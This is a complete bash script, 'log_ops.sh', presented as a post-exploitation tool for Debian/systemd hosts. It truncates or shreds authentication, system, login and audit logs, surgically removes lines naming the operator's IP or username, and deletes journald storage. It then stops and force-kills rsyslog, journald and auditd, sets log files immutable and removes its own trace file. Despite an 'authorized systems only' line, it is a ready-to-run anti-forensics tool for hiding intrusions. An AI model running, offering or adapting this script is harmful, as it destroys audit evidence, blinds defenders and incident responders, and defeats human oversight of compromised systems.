#!/bin/bash
#===============================================================================
# log_ops.sh — Post-Exploitation Log Management for Debian/Systemd Targets
# Usage:    ./log_ops.sh [--check] [--clear] [--disable] [--restore] [--full]
# Author:   Penetration Testing — Only on authorized systems
#===============================================================================

set -euo pipefail

# ─── CONFIGURATION ──────────────────────────────────────────────────────────
# Set this to your IP/CIDR for surgical log removal (leave empty to skip)
MY_IP=""
# Set this to your username for surgical removal (leave empty to skip)
MY_USER=""
# Set to "true" to use shred instead of truncate for log clearing
USE_SHRED="false"
# Set to "true" to also wipe auditd logs
WIPE_AUDIT="false"
# Log file to record what we did (for your own tracking, deleted at end)
OPLOG="/dev/shm/.logops"

# ─── HELPER FUNCTIONS ───────────────────────────────────────────────────────

log_this() {
    echo "[$(date '+%H:%M:%S')] $*" >> "$OPLOG" 2>/dev/null || true
}

die() {
    echo "[!] $*" >&2
    exit 1
}

check_root() {
    [[ $EUID -eq 0 ]] || die "Must be root. Elevate first (sudo, su, or exploit)."
}

# ─── DISCOVERY ──────────────────────────────────────────────────────────────

detect_logging() {
    echo "[*] Detecting logging subsystems..."

    # rsyslog
    if systemctl is-active --quiet rsyslog 2>/dev/null; then
        echo "  [rsyslog]  ACTIVE — PID: $(pgrep -x rsyslogd 2>/dev/null || echo '?')"
        RSYSLOG_ACTIVE=true
    else
        echo "  [rsyslog]  INACTIVE or not installed"
        RSYSLOG_ACTIVE=false
    fi

    # systemd-journald (always present on systemd systems)
    if systemctl is-active --quiet systemd-journald 2>/dev/null; then
        echo "  [journald] ACTIVE — PID: $(pgrep -x systemd-journald 2>/dev/null || echo '?')"
        JOURNAL_ACTIVE=true
    else
        echo "  [journald] INACTIVE (unusual on Debian with systemd)"
        JOURNAL_ACTIVE=false
    fi

    # auditd
    if systemctl is-active --quiet auditd 2>/dev/null; then
        echo "  [auditd]   ACTIVE — PID: $(pgrep -x auditd 2>/dev/null || echo '?')"
        AUDIT_ACTIVE=true
    else
        echo "  [auditd]   INACTIVE or not installed"
        AUDIT_ACTIVE=false
    fi

    # Persistent journal storage
    if [[ -d /var/log/journal ]] && [[ "$(ls -A /var/log/journal 2>/dev/null)" ]]; then
        echo "  [journal]  Persistent storage: YES"
        JOURNAL_PERSISTENT=true
    else
        echo "  [journal]  Persistent storage: NO (volatile only)"
        JOURNAL_PERSISTENT=false
    fi

    # Check for remote syslog forwarding
    REMOTE_SYSLOG=$(grep -rh '^\*\.\*[[:space:]]*@' /etc/rsyslog.conf /etc/rsyslog.d/ 2>/dev/null || true)
    if [[ -n "$REMOTE_SYSLOG" ]]; then
        echo "  [!] WARNING: Remote syslog forwarding detected!"
        echo "      $REMOTE_SYSLOG"
        echo "      Disabling local logging will NOT stop remote logs."
    fi
}

# ─── PHASE 1: CLEAR EXISTING LOGS ──────────────────────────────────────────

clear_logs() {
    echo ""
    echo "========== PHASE 1: CLEARING EXISTING LOGS =========="
    log_this "=== PHASE 1 START ==="

    # ── Text logs (rsyslog) ─────────────────────────────────────────────
    local LOG_FILES=(
        /var/log/auth.log
        /var/log/syslog
        /var/log/messages
        /var/log/daemon.log
        /var/log/kern.log
        /var/log/user.log
        /var/log/mail.log
        /var/log/mail.err
        /var/log/mail.warn
        /var/log/debug
        /var/log/cron.log
        /var/log/boot.log
        /var/log/dpkg.log
        /var/log/alternatives.log
        /var/log/faillog
        /var/log/lastlog
        /var/log/wtmp
        /var/log/btmp
    )

    for lf in "${LOG_FILES[@]}"; do
        if [[ -f "$lf" ]]; then
            if [[ "$USE_SHRED" == "true" ]]; then
                shred -f -z -n 3 "$lf" 2>/dev/null && echo "  [shred]   $lf" || echo "  [FAIL]    $lf"
            else
                truncate -s 0 "$lf" 2>/dev/null && echo "  [truncate] $lf" || echo "  [FAIL]    $lf"
            fi
            log_this "Cleared: $lf"
        fi
    done

    # ── Surgical removal of IP/username entries ─────────────────────────
    local SURGICAL_FILES=(/var/log/auth.log /var/log/syslog)

    if [[ -n "$MY_IP" ]]; then
        echo ""
        echo "[*] Surgically removing entries with IP: $MY_IP"
        for sf in "${SURGICAL_FILES[@]}"; do
            if [[ -f "$sf" ]]; then
                grep -v "$MY_IP" "$sf" > "${sf}.tmp" 2>/dev/null && mv "${sf}.tmp" "$sf" 2>/dev/null && \
                    echo "  [grep -v] Removed $MY_IP from $sf"
                log_this "Surgical remove IP $MY_IP from $sf"
            fi
        done
    fi

    if [[ -n "$MY_USER" ]]; then
        echo "[*] Surgically removing entries with user: $MY_USER"
        for sf in "${SURGICAL_FILES[@]}"; do
            if [[ -f "$sf" ]]; then
                grep -v " $MY_USER " "$sf" > "${sf}.tmp" 2>/dev/null && mv "${sf}.tmp" "$sf" 2>/dev/null && \
                    echo "  [grep -v] Removed $MY_USER from $sf"
                log_this "Surgical remove user $MY_USER from $sf"
            fi
        done
    fi

    # ── Journal (systemd-journald) ──────────────────────────────────────
    if command -v journalctl &>/dev/null; then
        echo ""
        echo "[*] Clearing systemd journal..."
        journalctl --rotate 2>/dev/null && echo "  [journalctl] Rotated journals"
        journalctl --vacuum-time=1s 2>/dev/null && echo "  [journalctl] Vacuumed all archives"
        if [[ "$JOURNAL_PERSISTENT" == "true" ]]; then
            rm -rf /var/log/journal/* 2>/dev/null && echo "  [rm]        Deleted persistent journal files"
        fi
        log_this "Journal cleared"
    fi

    # ── Audit logs ──────────────────────────────────────────────────────
    if [[ "$WIPE_AUDIT" == "true" ]] && [[ -d /var/log/audit ]]; then
        echo ""
        echo "[*] Clearing audit logs..."
        systemctl stop auditd 2>/dev/null || true
        truncate -s 0 /var/log/audit/audit.log 2>/dev/null || true
        truncate -s 0 /var/log/audit/audit.log.* 2>/dev/null || true
        echo "  [audit]    Cleared audit logs"
        log_this "Audit logs cleared"
    fi

    echo "========== PHASE 1 COMPLETE =========="
    log_this "=== PHASE 1 END ==="
}

# ─── PHASE 2: DISABLE LOGGING ─────────────────────────────────────────────

disable_logging() {
    echo ""
    echo "========== PHASE 2: DISABLING LOGGING =========="
    log_this "=== PHASE 2 START ==="

    # ── 1. Stop daemons ─────────────────────────────────────────────────
    echo "[*] Stopping logging daemons..."

    if [[ "$RSYSLOG_ACTIVE" == "true" ]]; then
        systemctl stop rsyslog 2>/dev/null && echo "  [systemctl] rsyslog stopped" || true
        log_this "rsyslog stopped"
    fi

    if [[ "$JOURNAL_ACTIVE" == "true" ]]; then
        systemctl stop systemd-journald 2>/dev/null && echo "  [systemctl] systemd-journald stopped" || true
        log_this "systemd-journald stopped"
    fi

    if [[ "$AUDIT_ACTIVE" == "true" ]]; then
        systemctl stop auditd 2>/dev/null && echo "  [systemctl] auditd stopped" || true
        log_this "auditd stopped"
    fi

    # ── 2. Force-kill any remaining processes ───────────────────────────
    echo "[*] Force-killing any remaining logger processes..."
    for PROC in rsyslogd systemd-journald auditd syslogd; do
        if pgrep -x "$PROC" &>/dev/null; then
            pkill -9 "$PROC" 2>/dev/null && echo "  [pkill -9] $PROC killed" || true
            log_this "$PROC force-killed"
        fi
    done

    # ── 3. Make key log files immutable ─────────────────────────────────
    echo "[*] Setting immutable flag on key log files..."
    local IMMUTABLE_FILES=(
        /var/log/auth.log
        /var/log/syslog
        /var/log/messages
        /var/log/daemon.log
        /var/log/kern.log
        /var/log/debug
        /var/log/wtmp
        /var/log/btmp
        /var/log/lastlog
    )

    # Verify filesystem supports chattr (ext2/3/4/xfs/btrfs)
    if command -v chattr &>/dev/null; then
        for imf in "${IMMUTABLE_FILES[@]}"; do
            if [[ -f "$imf" ]]; then
                chattr +i "$imf" 2>/dev/null && echo "  [chattr +i] $imf" || true
            fi
        done
        log_this "Immutable flag set on log files"
    else
        echo "  [SKIP]    chattr not available on this system"
    fi

    echo "========== PHASE 2 COMPLETE =========="
    log_this "=== PHASE 2 END ==="
}

# ─── RESTORE LOGGING (for when you come back or are done) ──────────────────

restore_logging() {
    echo ""
    echo "========== RESTORING LOGGING =========="
    log_this "=== RESTORE START ==="

    # Remove immutable flags
    if command -v chattr &>/dev/null; then
        echo "[*] Removing immutable flags..."
        local IMMUTABLE_FILES=(
            /var/log/auth.log
            /var/log/syslog
            /var/log/messages
            /var/log/daemon.log
            /var/log/kern.log
            /var/log/debug
            /var/log/wtmp
            /var/log/btmp
            /var/log/lastlog
        )
        for imf in "${IMMUTABLE_FILES[@]}"; do
            if [[ -f "$imf" ]]; then
                chattr -i "$imf" 2>/dev/null && echo "  [chattr -i] $imf" || true
            fi
        done
    fi

    # Restart daemons
    echo "[*] Restarting logging daemons..."
    systemctl start rsyslog 2>/dev/null && echo "  [systemctl] rsyslog started" || true
    systemctl start systemd-journald 2>/dev/null && echo "  [systemctl] systemd-journald started" || true
    systemctl start auditd 2>/dev/null && echo "  [systemctl] auditd started" || true

    echo "========== RESTORE COMPLETE =========="
    log_this "=== RESTORE END ==="
}

# ─── SELF-CLEAN ─────────────────────────────────────────────────────────────

self_clean() {
    echo ""
    echo "[*] Cleaning up script artifacts..."
    rm -f "$OPLOG" 2>/dev/null || true
    echo "  Removed: $OPLOG"
    # Shred and remove the script itself if desired
    # shred -f -z -n 3 "$0" && rm -f "$0"
}

# ─── USAGE ──────────────────────────────────────────────────────────────────

usage() {
    cat <<EOF
Usage: $0 [OPTION]

Options:
  --check         Detect and display logging subsystems (no modifications)
  --clear         Phase 1: Clear all existing logs
  --disable       Phase 2: Disable logging (stop daemons + chattr)
  --full          Run Phase 1 + Phase 2 (standard full op)
  --restore       Re-enable logging (remove chattr, restart daemons)
  --help          Show this message

Configuration (edit script variables at top):
  MY_IP           IP address to surgically remove from logs
  MY_USER         Username to surgically remove from logs
  USE_SHRED       Set "true" to use shred instead of truncate
  WIPE_AUDIT      Set "true" to also clear audit logs
EOF
    exit 0
}

# ─── MAIN ───────────────────────────────────────────────────────────────────

check_root

case "${1:-}" in
    --check)
        detect_logging
        ;;
    --clear)
        detect_logging
        clear_logs
        ;;
    --disable)
        detect_logging
        disable_logging
        ;;
    --full)
        detect_logging
        clear_logs
        disable_logging
        echo ""
        echo "=========================================="
        echo " FULL OP COMPLETE — Logs cleared, logging disabled."
        echo " You can now disconnect safely."
        echo " Use '$0 --restore' when you reconnect later."
        echo "=========================================="
        ;;
    --restore)
        restore_logging
        self_clean
        ;;
    --help|-h|*)
        usage
        ;;
esac